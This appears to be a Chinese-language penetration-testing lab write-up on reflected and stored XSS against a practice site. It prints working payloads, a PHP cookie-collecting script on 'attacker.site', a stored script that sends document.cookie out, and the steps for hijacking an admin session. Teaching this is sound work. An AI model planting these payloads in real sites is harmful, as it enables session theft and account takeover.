---
layout: post
title: "XSS"
date: "2022-06-29"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student
    - Web Attacks
---

# XSS
目标网站：`xssvictim.site`

首先导航网站，寻找可能的漏洞的注入点。

在网站顶端有SEARCH字段，通常是我们测试的首要目标。

在BLOG页面，网站允许用户在制定的发布内容下面留言。

```
User:john-Object:Wow
They will regret this!

User:admin-Object:Great!
This is really nice post.

You need to be logged to write a comment!
```
现在，我们没有登录，所以不能评论。

## 使用反射性XSS向受害者打印消息
首先测试搜索框，看它是如何工作的。

输入android，看到有一个发布内容满足我们的查询。看查询结果的顶端，似乎我们的搜索输入也打印在了结果页面，这是web应用程序很常见的行为。

现在我们要做的是检查输入在被打印在页面之前是否被过滤。

```
<h1>Hi</hi>
```

似乎输入一点也没有被过滤。检查源码。

下一步是检查是否Javascipt代码也可以正常工作。

```
<script>alert('XSS');</script>
```

这证明应用程序并没有过滤任何输入，它有反射性XSS漏洞。

```
<script>alert(document.cookie)</script>
```

我们可以构造payload，然后让受害者点击包含payload的URL。

## 使用存储型XSS窃取admin的cookie,并且用他的session登录
我们可以构造javascript payload，获取受害者的cookie，并且发回给我们。

受害者登录了应用程序，我们能够获取他的cookies，我们能够冒充他的session，通过修改浏览器中的session cookie。

在这样做之前，首先检查BLOG中的评论，这也是有漏洞的。

点击LOGIN进行登录。首先，我们需要登录来写评论。我们以attacker的身份登录。

再次打开BLOG页面，现在，我们可以向应用程序中插入评论。

|Object|Enter your comment here|结果|
|---|---|---|
|Hi|Test||
|`<h1>Hi</h1>`|test2|Object的输入被过滤，没有被解释为HTML标签|
|Test3|`<h1>test3</h1>`|应用程序解释的h1标签|
|test4|`<script>alert('xss');</script>`|浏览器出现了弹窗。因为是存储型XSS，这个消息会在我们每次加载页面的时候出现。使用我们删除这个post，否则，每次都会弹窗。|

现在我们知道该应用既有反射性XSS，又有存储型XSS，让我们尝试利用该应用程序来窃取用户的cookies。

尝试在消息中打印cookie

|Object|Enter your comment here|结果|
|---|---|---|
|test5|`<script>alert(document.cookie);</script>`|cookie出现在了弹窗中|

窃取访问该页面用户的cookie。我们不想让受害者看见弹窗，所以不会使用alert函数。

我们要做的是，构建能发送cookie信息到我们拥有和控制的网站的exploit。

在看javascript payload之前，首先让我们检查攻击者服务器`attacker.site`上的代码`get.php`，这是我们用来将cookie存储在我们机器上的脚本。

```php
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];

$fp = fopen('jar.txt', 'a');

fwrite($fp, $ip.' '.$browser."\n");
fwrite($fp, urldecode($_SERVER['QUERY_STRING'])." \n\n");
fclose($fp);
?>
```

当然，我们打在打开jar.txt，可以看到它是空的：

```
attacker.site/jar.txt
```

然后我们在浏览器中打开这个脚本，看看会发生什么：

```
attacker.site/get.php?test=hereismydata
```

当页面加载，参数的内容会被保存在jar.txt文件中，和我们设置的其他信息一起。

所以，当我们打开`attacker.site/jar.txt`，可以看到如下字符串：

```
192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
test=hereismydata
```

既然我们在攻击者的网站上已经有了可以工作的脚本，让我们创建将插入到评论表单payload。

这个简单的脚本创建新的image对象，然后将图片地址设置为我们的网站链接。有了这个简单的代码，我们触发受害者的浏览器请求攻击者页面，并且发送cookie。

我们用escape函数来避免特殊字符可能破坏我们的链接。受害者完全不知道发生了什么。

```html
<script>var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>
```

我们将这个脚本插入评论区。

由于网页会自动重新加载，如果它起作用了。我们需要设置将cookie存储在jar.txt文件中。

|Object|Enter your comment here|
|---|---|
|Hi all|This is a very nice post!`<script>var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie)</script>`|

刷新`attacker.site/jar.txt`：

```
192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
test=hereismydata

192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
cookie=PHPSESSID=b647jora2blimcguvoubamlb82
```

所以这个exploit，每次用户加载blog.php页面，他的cookie会被发送到我们的脚本，我们能够读取它们。

打开一个`New Private Window`。让我们站在受害者浏览器的角度打开网站。

访问`xssvictim.site`，LOGIN。我们将以admin的身份登录，然后我们浏览blog.php页面。

我们可以看到，在受害者浏览器中没有发生任何奇怪的事情。所以用户并不知道发生了什么。

让我们返回jar.txt文件，看看我们收集到了什么。访问`attacker.site/jar.txt`。

```
192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
test=hereismydata

192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
cookie=PHPSESSID=b647jora2blimcguvoubamlb82

192.168.3.22 Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0
cookie=PHPSESSID=e6unaoterp5rlbjhr3i4l73bi5
```
我们成功的窃取了admin的cookie，现在我们需要在web应用程序假冒他的session，这意味着，我们会以admin的身份登录。

让我们复制该值，然后回到攻击者的浏览器。使用Firebug添加cookie，用将值替换成管理员的cookie。

我们当前登录身份是attacker，重新加载页面。可以看到，我们被身份验证为admin，因此在顶栏，我们可以看到ADMIN PAGE的新链接。

我们可以像往常一样导航web应用程序，以admin的身份登录。



